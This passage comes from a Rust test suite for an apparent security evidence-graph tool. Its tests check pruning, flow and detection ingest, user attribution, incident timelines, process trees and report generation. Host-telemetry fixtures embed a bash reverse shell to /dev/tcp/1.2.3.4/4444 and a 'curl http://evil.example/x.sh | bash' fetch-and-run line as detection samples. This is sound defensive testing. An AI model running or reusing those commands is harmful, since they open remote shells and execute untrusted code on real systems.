    fn prune_sweeps_stale_incident_and_its_report_as_a_coherent_unit_when_evidence_free() {
        let g = EvidenceGraph::open_memory().unwrap();
        let old_ts = days_ago(200.0);

        // Device C: two OLD detections, correlated into an incident, then reported.
        g.ingest_detection(&detection_line(old_ts, 1000001, "203.0.113.30", "192.168.1.1", 22)).unwrap();
        g.ingest_detection(&detection_line(old_ts, 1000002, "203.0.113.30", "192.168.1.1", 23)).unwrap();
        let inc_id = g.correlate_incident("203.0.113.30", "Old fully-stale incident").unwrap();
        let report_id = g.generate_report(&inc_id).unwrap().expect("report must be generated");

        // Sanity: both exist before pruning.
        let inc_before: i64 = g.conn.query_row("SELECT count(*) FROM incidents WHERE id=?", params![&inc_id], |r| r.get(0)).unwrap();
        let rep_before: i64 = g.conn.query_row("SELECT count(*) FROM reports WHERE id=?", params![&report_id], |r| r.get(0)).unwrap();
        assert_eq!(inc_before, 1);
        assert_eq!(rep_before, 1);

        let stats = g.prune(30.0, None).unwrap();
        assert_eq!(stats.deleted_incidents, 1, "the now-evidence-free old incident must be pruned as a unit");
        assert_eq!(stats.deleted_reports, 1, "its report must be pruned alongside it");

        let inc_after: i64 = g.conn.query_row("SELECT count(*) FROM incidents WHERE id=?", params![&inc_id], |r| r.get(0)).unwrap();
        let rep_after: i64 = g.conn.query_row("SELECT count(*) FROM reports WHERE id=?", params![&report_id], |r| r.get(0)).unwrap();
        assert_eq!(inc_after, 0);
        assert_eq!(rep_after, 0);

        assert_no_dangling_edges(&g);
    }

    #[test]
    fn prune_keeps_incident_and_report_that_still_cite_live_evidence_even_if_the_incident_is_old() {
        let g = EvidenceGraph::open_memory().unwrap();
        let old_ts = days_ago(200.0);
        let recent_ts = days_ago(1.0);

        // Device D: one OLD detection, correlated into an OLD incident (ts=old) + report.
        let old_det = g
            .ingest_detection(&detection_line(old_ts, 1000001, "203.0.113.40", "192.168.1.1", 22))
            .unwrap()
            .unwrap();
        let inc_id = g.correlate_incident("203.0.113.40", "Old incident, still-live evidence").unwrap();
        let report_id = g.generate_report(&inc_id).unwrap().unwrap();
        let inc_ts: f64 = g.conn.query_row("SELECT ts FROM incidents WHERE id=?", params![&inc_id], |r| r.get(0)).unwrap();
        assert!(inc_ts < days_ago(30.0), "the incident itself must be older than the retention cutoff for this test to be meaningful");

        // Simulate a RECENT detection that a later correlation pass linked to this SAME incident
        // (this crate's `correlate_incident` fans out to every CURRENTLY-existing detection for a
        // device at call time — a manual edge insert here isolates the PRUNE POLICY under test
        // from that fan-out's exact mechanics: "does an incident with >=1 live detection edge
        // survive", regardless of how that edge came to exist).
        let recent_det = g
            .ingest_detection(&detection_line(recent_ts, 1000002, "203.0.113.40", "192.168.1.1", 23))
            .unwrap()
            .unwrap();
        g.conn.execute(
            "INSERT INTO edges VALUES (?,?,?,?) ON CONFLICT DO NOTHING",
            params![&inc_id, "incident_includes_detection", &recent_det, recent_ts],
        ).unwrap();

        g.prune(30.0, None).unwrap();

        // The old detection is gone (age-based sweep); the recent one, the incident, and the
        // report all survive because the incident still cites LIVE evidence.
        let old_det_exists: i64 = g.conn.query_row("SELECT count(*) FROM detections WHERE id=?", params![&old_det], |r| r.get(0)).unwrap();
        assert_eq!(old_det_exists, 0);
        let recent_det_exists: i64 = g.conn.query_row("SELECT count(*) FROM detections WHERE id=?", params![&recent_det], |r| r.get(0)).unwrap();
        assert_eq!(recent_det_exists, 1);
        let inc_exists: i64 = g.conn.query_row("SELECT count(*) FROM incidents WHERE id=?", params![&inc_id], |r| r.get(0)).unwrap();
        assert_eq!(inc_exists, 1, "an old incident that still cites live evidence must be KEPT, never orphaned or force-deleted");
        let rep_exists: i64 = g.conn.query_row("SELECT count(*) FROM reports WHERE id=?", params![&report_id], |r| r.get(0)).unwrap();
        assert_eq!(rep_exists, 1);

        assert_no_dangling_edges(&g);
    }

    #[test]
    fn prune_size_cap_deletes_oldest_first_and_vacuum_shrinks_the_file_on_disk() {
        let path = std::env::temp_dir().join(format!(
            "hp-evidence-prune-sizecap-test-{}-{}.db",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
        ));
        std::fs::remove_file(&path).ok();
        {
            let g = EvidenceGraph::open(&path).unwrap();
            // Seed enough rows, oldest-first, that a size cap forces some to be pruned even though
            // ALL of them are inside the age-based retention window (proves the size cap is a REAL
            // second, independent lever -- not just age-based retention wearing a size-flag hat).
            // Batched in ONE transaction (like the real ingest CLI's `g.begin()`/`g.commit()`) --
            // 500 individually auto-committed inserts under `synchronous=NORMAL` would each pay a
            // real fsync, which is the actual ingest path's own documented reason for batching.
            g.begin().unwrap();
            for i in 0..500i64 {
                let ts = days_ago(1.0) - (i as f64); // strictly oldest-first, all well within 30d
                g.ingest_flow(&flow_line(ts, &format!("203.0.113.{}", i % 250), "192.168.1.1", 22)).unwrap();
            }
            g.commit().unwrap();
            let (_, flows_before, _, _) = g.counts().unwrap();
            assert_eq!(flows_before, 500);
            let size_before_probe = g.db_size_bytes().unwrap();
            assert!(size_before_probe > 0);

            // An unreachably tiny cap forces the size-based sweep to do essentially all the work
            // (bounded to 20 batches x 1000 rows -- more than enough to drain 500 rows).
            let stats = g.prune(30.0, Some(1024)).unwrap();
            assert!(stats.deleted_nodes > 0, "the size cap must force oldest-first deletion");
            assert!(stats.vacuumed, "a prune pass that deleted anything must VACUUM");
            assert!(
                stats.size_after_bytes <= stats.size_before_bytes,
                "VACUUM must not leave the file bigger than before (before={}, after={})",
                stats.size_before_bytes, stats.size_after_bytes
            );

            let (_, flows_after, _, _) = g.counts().unwrap();
            assert!(flows_after < flows_before, "at least some flows must have been deleted oldest-first");
            assert_no_dangling_edges(&g);
        }
        // The file on disk must actually be smaller (or at least no bigger) after VACUUM -- a
        // DELETE alone would NOT shrink the file; this confirms VACUUM really ran and reclaimed it.
        let final_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
        assert!(final_size > 0, "the pruned+vacuumed db file must still exist and be openable");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn prune_persists_last_prune_meta_visible_via_graph_stats() {
        let g = EvidenceGraph::open_memory().unwrap();
        // Before any prune: graph_stats must report `last_prune: null`, never fabricate one.
        let before: serde_json::Value = serde_json::from_str(&g.graph_stats().unwrap()).unwrap();
        assert!(before["last_prune"].is_null());
        assert!(before["db_size_bytes"].as_i64().unwrap() > 0, "an empty DB still has a real page-based size");

        g.ingest_detection(&detection_line(days_ago(200.0), 1000001, "203.0.113.50", "192.168.1.1", 22)).unwrap();
        let stats = g.prune(30.0, None).unwrap();

        let after: serde_json::Value = serde_json::from_str(&g.graph_stats().unwrap()).unwrap();
        assert!(!after["last_prune"].is_null(), "graph_stats must surface the prune that just ran");
        assert_eq!(after["last_prune"]["retention_days"], 30.0);
        assert_eq!(after["last_prune"]["deleted_nodes"], stats.deleted_nodes);
        assert_eq!(after["last_prune"]["vacuumed"], stats.vacuumed);
    }

    #[test]
    fn lifecycle_ingest_links_prompt_to_its_changes_and_gates() {
        use std::io::Write;
        let g = EvidenceGraph::open_memory().unwrap();
        // One Claude Code session: a prompt → two edits → a green gate; then a NEW prompt → an edit.
        let log = "\
{\"kind\":\"intent\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:00:00Z\",\"summary\":\"add port-scan detector\",\"detail\":\"...\"}
{\"kind\":\"change\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:01:00Z\",\"summary\":\"Edit portscan.rs\",\"detail\":\"modules/.../portscan.rs\"}
{\"kind\":\"change\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:02:00Z\",\"summary\":\"Edit dpi.rs\",\"detail\":\"...\"}
{\"kind\":\"gate\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:03:00Z\",\"summary\":\"cargo test -> 0\",\"detail\":\"26 passed\"}
{\"kind\":\"intent\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:10:00Z\",\"summary\":\"wire the responder\",\"detail\":\"...\"}
{\"kind\":\"change\",\"session\":\"sess-abc\",\"ts\":\"2026-07-03T20:11:00Z\",\"summary\":\"Edit main.rs\",\"detail\":\"...\"}
garbage-not-json-should-be-skipped
";
        let path = std::env::temp_dir().join(format!("hp-lifecycle-test-{}.jsonl", std::process::id()));
        std::fs::File::create(&path).unwrap().write_all(log.as_bytes()).unwrap();
        let n = g.ingest_lifecycle_file(&path).unwrap();
        assert_eq!(n, 6, "6 valid events (the garbage line is skipped fail-open)");

        // One session node, six lifecycle-event nodes.
        let sessions: i64 = g.conn.query_row("SELECT count(*) FROM sessions", [], |r| r.get(0)).unwrap();
        assert_eq!(sessions, 1);
        let events: i64 = g.conn.query_row("SELECT count(*) FROM lifecycle_events", [], |r| r.get(0)).unwrap();
        assert_eq!(events, 6);
        // The session's recorded intent is the LATEST prompt.
        let intent: String = g.conn.query_row("SELECT intent FROM sessions", [], |r| r.get(0)).unwrap();
        assert_eq!(intent, "wire the responder");

        // led_to: prompt-1 → its 2 changes + 1 gate = 3; prompt-2 → its 1 change = 1; total 4.
        let led: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE edge_type=?", params![EDGE_LED_TO], |r| r.get(0)).unwrap();
        assert_eq!(led, 4, "each prompt links to the changes/gates it produced");
        // in_session: session → all 6 events.
        let insess: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE edge_type=?", params![EDGE_IN_SESSION], |r| r.get(0)).unwrap();
        assert_eq!(insess, 6);

        // Idempotent: re-ingest the same log changes nothing.
        let (_, _, _, e_before) = g.counts().unwrap();
        g.ingest_lifecycle_file(&path).unwrap();
        let (_, _, _, e_after) = g.counts().unwrap();
        assert_eq!(e_before, e_after, "re-ingest is idempotent (node + edge PKs)");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn track_trace_detection_to_device_and_flows() {
        let g = EvidenceGraph::open_memory().unwrap();
        // 3 SSH SYN-only flows from one attacker
        for i in 0..3u64 {
            let f = format!(
                "{{\"type\":\"conn\",\"ts\":{}.0,\"src_ip\":\"203.0.113.7\",\"src_port\":{},\"dst_ip\":\"192.168.1.1\",\"dst_port\":22,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"orig_bytes\":0,\"resp_bytes\":0}}",
                1000 + i, 54000 + i);
            g.ingest_flow(&f).unwrap();
        }
        // a NAPSE detection on that traffic
        let d = "{\"ts\":1000.0,\"rule_id\":1000001,\"rule_msg\":\"NAPSE SSH Brute Force Attempt\",\"category\":\"brute_force\",\"severity\":2,\"mitre\":\"T1110\",\"src_ip\":\"203.0.113.7\",\"dst_ip\":\"192.168.1.1\",\"dst_port\":22,\"confidence\":0.75}";
        let det_id = g.ingest_detection(d).unwrap().unwrap();

        let (dev, fl, de, ed) = g.counts().unwrap();
        assert_eq!(dev, 1, "one device");
        assert_eq!(fl, 3, "three flows");
        assert_eq!(de, 1, "one detection");
        assert!(ed >= 7, "3 flow_from_device + 1 detects_on_device + 3 detection_on_flow, got {ed}");

        let trace = g.trace_detection(&det_id).unwrap();
        eprintln!("TRACE: {trace}");
        assert!(trace.contains("brute_force") && trace.contains("203.0.113.7"));
        assert!(trace.contains("\"linked_flows\":3"), "detection must link to the 3 triggering flows");
        assert!(trace.contains("\"device_total_flows\":3"));
    }

    #[test]
    fn output_is_valid_json_under_injection_and_reingest_is_idempotent() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a detection whose rule_msg/category try to break out of JSON (quote, newline, backslash)
        let nasty = "eXe\" ,\"injected\":\"x\n2nd\\line";
        let evil = serde_json::json!({
            "ts": 1.0, "rule_id": 1, "rule_msg": nasty, "category": "a\"b\tc",
            "severity": 1, "src_ip": "1.2.3.4", "dst_ip": "5.6.7.8", "dst_port": 22, "confidence": 0.5
        }).to_string();
        let det_id = g.ingest_detection(&evil).unwrap().unwrap();

        // the OLD hand-formatted output would be invalid JSON here; serde_json must round-trip it.
        let trace = g.trace_detection(&det_id).unwrap();
        let v: serde_json::Value = serde_json::from_str(&trace).expect("trace must be valid JSON");
        assert_eq!(v["detection"], nasty);
        assert_eq!(v["device"], "1.2.3.4");

        // idempotency: re-ingesting the same flow must NOT duplicate edges (PK + ON CONFLICT).
        let flow = "{\"type\":\"conn\",\"ts\":1.0,\"src_ip\":\"1.2.3.4\",\"src_port\":5,\"dst_ip\":\"5.6.7.8\",\"dst_port\":22,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"orig_bytes\":0,\"resp_bytes\":0}";
        g.ingest_flow(flow).unwrap();
        let (_, _, _, e1) = g.counts().unwrap();
        g.ingest_flow(flow).unwrap();
        let (_, _, _, e2) = g.counts().unwrap();
        assert_eq!(e1, e2, "re-ingest must not duplicate edges");
    }

    // ---- Track/trace chain closure: Interface / Application / Session (S2/S3) ------------------

    #[test]
    fn ingest_flow_creates_interface_application_and_session_nodes() {
        let g = EvidenceGraph::open_memory().unwrap();
        // A LAN client's DNS query to a resolver: src is LAN, dst_port 53, service="dns".
        let dns = r#"{"type":"dns","ts":100.0,"src_ip":"10.66.0.20","src_port":40000,"dst_ip":"1.1.1.1","dst_port":53,"proto":"udp","service":"dns","query":"example.com","query_len":11,"query_entropy":3.0}"#;
        let flow_id = g.ingest_flow(dns).unwrap().unwrap();

        // Interface: LAN role.
        let iface_id = "iface:lan";
        let role: String = g.conn.query_row("SELECT role FROM interfaces WHERE id=?", params![iface_id], |r| r.get(0)).unwrap();
        assert_eq!(role, "lan");
        let has_iface_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='flow_on_interface' AND dst_id=?",
            params![flow_id, iface_id], |r| r.get(0)).unwrap();
        assert_eq!(has_iface_edge, 1);

        // Application: service+dst_port key ("dns:53").
        let app_id = sid("app", "dns:53");
        let service: String = g.conn.query_row("SELECT service FROM applications WHERE id=?", params![app_id], |r| r.get(0)).unwrap();
        assert_eq!(service, "dns");
        let has_app_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='flow_to_application' AND dst_id=?",
            params![flow_id, app_id], |r| r.get(0)).unwrap();
        assert_eq!(has_app_edge, 1);

        // Session: (src_ip,dst_ip) pair, 30-min bucket.
        let sess_id = sid("netsess", "10.66.0.20>1.1.1.1@0");
        let src_ip: String = g.conn.query_row("SELECT src_ip FROM net_sessions WHERE id=?", params![sess_id], |r| r.get(0)).unwrap();
        assert_eq!(src_ip, "10.66.0.20");
        let has_sess_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='flow_in_session' AND dst_id=?",
            params![flow_id, sess_id], |r| r.get(0)).unwrap();
        assert_eq!(has_sess_edge, 1);

        // A WAN-sourced flow gets iface:wan (not iface:lan).
        let wan_flow = r#"{"type":"conn","ts":100.0,"src_ip":"203.0.113.7","src_port":51000,"dst_ip":"192.168.1.10","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#;
        g.ingest_flow(wan_flow).unwrap();
        let wan_role: String = g.conn.query_row("SELECT role FROM interfaces WHERE id='iface:wan'", [], |r| r.get(0)).unwrap();
        assert_eq!(wan_role, "wan");
    }

    #[test]
    fn ingest_flow_application_prefers_http_host_then_sni_then_service_then_bare_port() {
        let g = EvidenceGraph::open_memory().unwrap();
        let http = r#"{"type":"http","ts":1.0,"src_ip":"10.0.0.5","src_port":1,"dst_ip":"1.2.3.4","dst_port":80,"proto":"tcp","service":"http","method":"GET","uri":"/","http_host":"intranet.local"}"#;
        let flow1 = g.ingest_flow(http).unwrap().unwrap();
        let app1 = sid("app", "http:intranet.local");
        let ok: i64 = g.conn.query_row("SELECT count(*) FROM applications WHERE id=?", params![app1], |r| r.get(0)).unwrap();
        assert_eq!(ok, 1, "http_host wins over service");
        let has_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='flow_to_application' AND dst_id=?",
            params![flow1, app1], |r| r.get(0)).unwrap();
        assert_eq!(has_edge, 1);

        let tls = r#"{"type":"tls","ts":2.0,"src_ip":"10.0.0.5","src_port":2,"dst_ip":"1.2.3.5","dst_port":443,"proto":"tcp","service":"tls","tls_version":"TLSv1.2","ja3":"abc123","tls_sni":"api.example.com"}"#;
        g.ingest_flow(tls).unwrap();
        let app2 = sid("app", "tls:api.example.com");
        let ok2: i64 = g.conn.query_row("SELECT count(*) FROM applications WHERE id=?", params![app2], |r| r.get(0)).unwrap();
        assert_eq!(ok2, 1, "tls_sni wins over service when no http_host");

        // bare conn record: no service/sni/http_host at all -> falls back to dst_port.
        let conn = r#"{"type":"conn","ts":3.0,"src_ip":"10.0.0.5","src_port":3,"dst_ip":"1.2.3.6","dst_port":9999,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#;
        g.ingest_flow(conn).unwrap();
        let app3 = sid("app", "port:9999");
        let ok3: i64 = g.conn.query_row("SELECT count(*) FROM applications WHERE id=?", params![app3], |r| r.get(0)).unwrap();
        assert_eq!(ok3, 1, "bare dst_port is the honest fallback, never fabricated");
    }

    // ---- Track/trace chain closure: User (S2/S3), honest attribution ------------------------------

    #[test]
    fn network_detection_from_wan_attributes_unknown_user_lan_detection_stays_unattributed() {
        let g = EvidenceGraph::open_memory().unwrap();
        let wan_det = r#"{"ts":1.0,"rule_id":1000003,"rule_msg":"port scan","category":"port_scan","severity":2,"mitre":"T1046","src_ip":"203.0.113.7","dst_ip":"192.168.1.1","dst_port":22,"confidence":0.9}"#;
        let det_id = g.ingest_detection(wan_det).unwrap().unwrap();
        let has_unknown_user_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detection_by_user' AND dst_id='user:unknown'",
            params![det_id], |r| r.get(0)).unwrap();
        assert_eq!(has_unknown_user_edge, 1, "WAN-origin traffic is structurally unattributable — 'unknown' IS the honest answer");

        let lan_det = r#"{"ts":2.0,"rule_id":1000001,"rule_msg":"ssh brute force","category":"brute_force","severity":2,"mitre":"T1110","src_ip":"10.66.0.20","dst_ip":"10.66.0.1","dst_port":22,"confidence":0.7}"#;
        let lan_det_id = g.ingest_detection(lan_det).unwrap().unwrap();
        let lan_user_edges: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detection_by_user'",
            params![lan_det_id], |r| r.get(0)).unwrap();
        assert_eq!(lan_user_edges, 0, "LAN with no known credential telemetry: leave unattributed, never fabricate 'unknown'");
    }

    #[test]
    fn host_credential_event_creates_user_node_and_attributes_the_host_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        // A real login/credential event for 'alice' on this device.
        let cred = r#"{"type":"credential","ts":1.0,"device_ip":"10.66.0.30","pid":100,"principal":"alice","kind":"login"}"#;
        g.ingest_host_event(cred).unwrap();
        let user_id = sid("user", "alice");
        let principal: String = g.conn.query_row("SELECT principal FROM users WHERE id=?", params![user_id], |r| r.get(0)).unwrap();
        assert_eq!(principal, "alice");
        let cnode = sid("cred", "10.66.0.30:alice");
        let has_cred_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='credential_of_user' AND dst_id=?",
            params![cnode, user_id], |r| r.get(0)).unwrap();
        assert_eq!(has_cred_edge, 1);

        // A reverse-shell exec on the SAME device now attributes to 'alice' (real host telemetry).
        let exec = r#"{"type":"process","ts":2.0,"device_ip":"10.66.0.30","pid":200,"parent_pid":0,"name":"bash","cmdline":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}"#;
        g.ingest_host_event(exec).unwrap();
        let det_id: String = g.conn.query_row(
            "SELECT id FROM detections WHERE src_ip='10.66.0.30' ORDER BY ts DESC LIMIT 1", [], |r| r.get(0)).unwrap();
        let has_user_edge: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detection_by_user' AND dst_id=?",
            params![det_id, user_id], |r| r.get(0)).unwrap();
        assert_eq!(has_user_edge, 1, "host-EDR detection attributed to the device's known credential principal");
    }

    // ---- Investigation endpoints: incident_timeline / incident_process_tree -----------------------

    #[test]
    fn incident_timeline_is_ts_ordered_and_reports_not_found_for_unknown_incident() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert_eq!(
            g.incident_timeline("inc:does-not-exist").unwrap(),
            serde_json::json!({"incident": "inc:does-not-exist", "found": false}).to_string()
        );

        // Out-of-order ingestion; the timeline must still come back ts-ascending.
        g.ingest_flow(r#"{"type":"conn","ts":300.0,"src_ip":"203.0.113.7","src_port":1,"dst_ip":"192.168.1.1","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#).unwrap();
        g.ingest_detection(r#"{"ts":100.0,"rule_id":1000001,"rule_msg":"brute force","category":"brute_force","severity":2,"mitre":"T1110","src_ip":"203.0.113.7","dst_ip":"192.168.1.1","dst_port":22,"confidence":0.7}"#).unwrap();
        g.ingest_response(r#"{"ts":200.0,"rule_id":1000001,"src_ip":"203.0.113.7","dst_ip":"192.168.1.1","dst_port":22,"action":"quarantine","target":"203.0.113.7","mechanism":"nft","detail":"blocked","ttl_secs":300,"status":"active"}"#).unwrap();
        let inc_id = g.correlate_incident("203.0.113.7", "Brute force incident").unwrap();

        let timeline: serde_json::Value = serde_json::from_str(&g.incident_timeline(&inc_id).unwrap()).unwrap();
        assert_eq!(timeline["found"], true);
        let events = timeline["events"].as_array().unwrap();
        assert!(events.len() >= 3, "detection + flow + response, at least");
        let ts_values: Vec<f64> = events.iter().map(|e| e["ts"].as_f64().unwrap()).collect();
        let mut sorted = ts_values.clone();
        sorted.sort_by(|a, b| a.partial_cmp(b).unwrap());
        assert_eq!(ts_values, sorted, "timeline must be ts-ascending regardless of ingest order");
    }

    #[test]
    fn incident_process_tree_walks_spawned_by_and_reports_not_found_for_unknown_incident() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert_eq!(
            g.incident_process_tree("inc:does-not-exist").unwrap(),
            serde_json::json!({"incident": "inc:does-not-exist", "found": false}).to_string()
        );

        // init(1) -> bash(50) -> curl|bash reverse shell (51) -- a 3-level process tree.
        g.ingest_host_event(r#"{"type":"process","ts":1.0,"device_ip":"10.66.0.40","pid":1,"parent_pid":0,"name":"init","cmdline":"/sbin/init"}"#).unwrap();
        g.ingest_host_event(r#"{"type":"process","ts":2.0,"device_ip":"10.66.0.40","pid":50,"parent_pid":1,"name":"bash","cmdline":"bash"}"#).unwrap();
        g.ingest_host_event(r#"{"type":"process","ts":3.0,"device_ip":"10.66.0.40","pid":51,"parent_pid":50,"name":"bash","cmdline":"curl http://evil.example/x.sh | bash"}"#).unwrap();
        g.correlate_all(0.0).unwrap();
        let inc_id: String = g.conn.query_row("SELECT id FROM incidents WHERE device_ip='10.66.0.40'", [], |r| r.get(0)).unwrap();

        let tree: serde_json::Value = serde_json::from_str(&g.incident_process_tree(&inc_id).unwrap()).unwrap();
        assert_eq!(tree["found"], true);
        assert_eq!(tree["process_count"], 3);
        let roots = tree["roots"].as_array().unwrap();
        assert_eq!(roots.len(), 1, "init(1) is the only process with no parent in the subgraph");
        assert_eq!(roots[0]["pid"], 1);
        let child = &roots[0]["children"][0];
        assert_eq!(child["pid"], 50);
        let grandchild = &child["children"][0];
        assert_eq!(grandchild["pid"], 51);
        assert!(grandchild["cmdline"].as_str().unwrap().contains("curl"));
    }

    // ---- Report generation: the evidence-chain terminus (S2) ---------------------------------------

    #[test]
    fn generate_report_returns_none_for_unknown_incident() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert!(g.generate_report("inc:does-not-exist").unwrap().is_none());
    }

    #[test]
    fn generate_report_cites_evidence_and_drills_back_round_trip() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_flow(r#"{"type":"conn","ts":100.0,"src_ip":"203.0.113.9","src_port":1,"dst_ip":"192.168.1.1","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#).unwrap();
        let det_id = g.ingest_detection(r#"{"ts":100.0,"rule_id":1000001,"rule_msg":"NAPSE SSH Brute Force","category":"brute_force","severity":2,"mitre":"T1110","src_ip":"203.0.113.9","dst_ip":"192.168.1.1","dst_port":22,"confidence":0.8}"#).unwrap().unwrap();
        g.ingest_response(r#"{"ts":101.0,"rule_id":1000001,"src_ip":"203.0.113.9","dst_ip":"192.168.1.1","dst_port":22,"action":"quarantine","target":"203.0.113.9","mechanism":"nft","detail":"blocked 300s","ttl_secs":300,"status":"active"}"#).unwrap();
        let inc_id = g.correlate_incident("203.0.113.9", "SSH brute force incident").unwrap();

        let rep_id = g.generate_report(&inc_id).unwrap().expect("incident exists");

        // report_covers_incident + report_cites_evidence edges exist and cite REAL node ids.
        let covers: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='report_covers_incident' AND dst_id=?",
            params![rep_id, inc_id], |r| r.get(0)).unwrap();
        assert_eq!(covers, 1);
        let cites_detection: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='report_cites_evidence' AND dst_id=?",
            params![rep_id, det_id], |r| r.get(0)).unwrap();
        assert_eq!(cites_detection, 1, "the report must cite the detection it's built from");

        // report_detail drills back: MITRE technique, evidence node ids, response taken, confidence.
        let detail: serde_json::Value = serde_json::from_str(&g.report_detail(&rep_id).unwrap().unwrap()).unwrap();
        assert_eq!(detail["incident_id"], inc_id);
        let report = &detail["report"];
        assert!(report["mitre_techniques"].as_array().unwrap().contains(&serde_json::json!("T1110")));
        assert!(report["evidence_node_ids"].as_array().unwrap().iter().any(|v| v.as_str() == Some(det_id.as_str())));
        assert!(!report["response_taken"].as_array().unwrap().is_empty(), "the response action taken must be in the report");
        assert!(report["confidence"].as_f64().unwrap() > 0.0);
        assert!(!report["timeline"].as_array().unwrap().is_empty());

        // list_reports serves it too.
        let listed: serde_json::Value = serde_json::from_str(&g.list_reports(10).unwrap()).unwrap();
        assert_eq!(listed["count"], 1);

        // Idempotent re-generation: same report id, no duplicate edges.
        let (_, _, _, e1) = g.counts().unwrap();
        let rep_id2 = g.generate_report(&inc_id).unwrap().unwrap();
        assert_eq!(rep_id, rep_id2, "one report PER incident — re-generating overwrites in place");
        let (_, _, _, e2) = g.counts().unwrap();
        assert_eq!(e1, e2, "re-generating must not duplicate citation edges");
    }

    /// F5 (`--stats`): `detection_breakdown()` groups by category and by rule_id, highest-count-first,
    /// and preserves that ordering through JSON serialization (arrays, not a `BTreeMap`-backed object
    /// — see the function's own doc for why an object would silently re-sort alphabetically).
    #[test]
    fn detection_breakdown_groups_by_category_and_rule_id_highest_first() {
        let g = EvidenceGraph::open_memory().unwrap();
        // 3x port_scan (rule 1000001), 1x brute_force (rule 1000002) — port_scan must sort first.
        for i in 0..3u64 {
            let d = format!(
                "{{\"ts\":{}.0,\"rule_id\":1000001,\"rule_msg\":\"scan\",\"category\":\"port_scan\",\"severity\":2,\"mitre\":\"\",\"src_ip\":\"10.0.0.{}\",\"dst_ip\":\"10.0.0.9\",\"dst_port\":22,\"confidence\":0.8}}",
                1000 + i, 10 + i
            );
            g.ingest_detection(&d).unwrap();
        }
        g.ingest_detection("{\"ts\":2000.0,\"rule_id\":1000002,\"rule_msg\":\"brute\",\"category\":\"brute_force\",\"severity\":2,\"mitre\":\"\",\"src_ip\":\"10.0.0.20\",\"dst_ip\":\"10.0.0.9\",\"dst_port\":22,\"confidence\":0.7}").unwrap();

        let breakdown = g.detection_breakdown().unwrap();
        eprintln!("BREAKDOWN: {breakdown}");
        let v: serde_json::Value = serde_json::from_str(&breakdown).expect("must be valid JSON");
        let by_cat = v["by_category"].as_array().expect("by_category is an array");
        assert_eq!(by_cat.len(), 2);
        assert_eq!(by_cat[0]["category"], "port_scan", "highest count (3) must sort first");
        assert_eq!(by_cat[0]["count"], 3);
        assert_eq!(by_cat[1]["category"], "brute_force");
        assert_eq!(by_cat[1]["count"], 1);

        let by_rule = v["by_rule_id"].as_array().expect("by_rule_id is an array");
        assert_eq!(by_rule.len(), 2);
        assert_eq!(by_rule[0]["rule_id"], 1000001);
        assert_eq!(by_rule[0]["count"], 3);
        assert_eq!(by_rule[1]["rule_id"], 1000002);
        assert_eq!(by_rule[1]["count"], 1);
    }

    #[test]
    fn detection_breakdown_empty_db_returns_empty_arrays() {
        let g = EvidenceGraph::open_memory().unwrap();
        let breakdown = g.detection_breakdown().unwrap();
        let v: serde_json::Value = serde_json::from_str(&breakdown).unwrap();
        assert_eq!(v["by_category"].as_array().unwrap().len(), 0);
        assert_eq!(v["by_rule_id"].as_array().unwrap().len(), 0);
    }

    #[test]
    fn attack_path_spans_network_and_host_layers() {
        let g = EvidenceGraph::open_memory().unwrap();
        // network layer: a flow + a detection on a target device
        g.ingest_flow("{\"type\":\"conn\",\"ts\":100.0,\"src_ip\":\"10.0.0.5\",\"src_port\":4444,\"dst_ip\":\"10.0.0.9\",\"dst_port\":445,\"proto\":\"tcp\",\"conn_state\":\"SF\",\"orig_bytes\":10,\"resp_bytes\":10}").unwrap();
        // rule_id 1000041 = napse-capture's lateral::LATERAL_RULE_ID (T1021, "lateral_movement")
        // — NOT 1000009, which is modules/napse's real, unrelated "TLS Downgrade" rule.
        g.ingest_detection("{\"ts\":100.0,\"rule_id\":1000041,\"rule_msg\":\"Lateral Movement\",\"category\":\"lateral_movement\",\"severity\":3,\"mitre\":\"T1021\",\"src_ip\":\"10.0.0.5\",\"dst_ip\":\"10.0.0.9\",\"dst_port\":445,\"confidence\":0.9}").unwrap();
        // host layer: powershell → malicious.exe → registry key + credential-dump file (the right half)
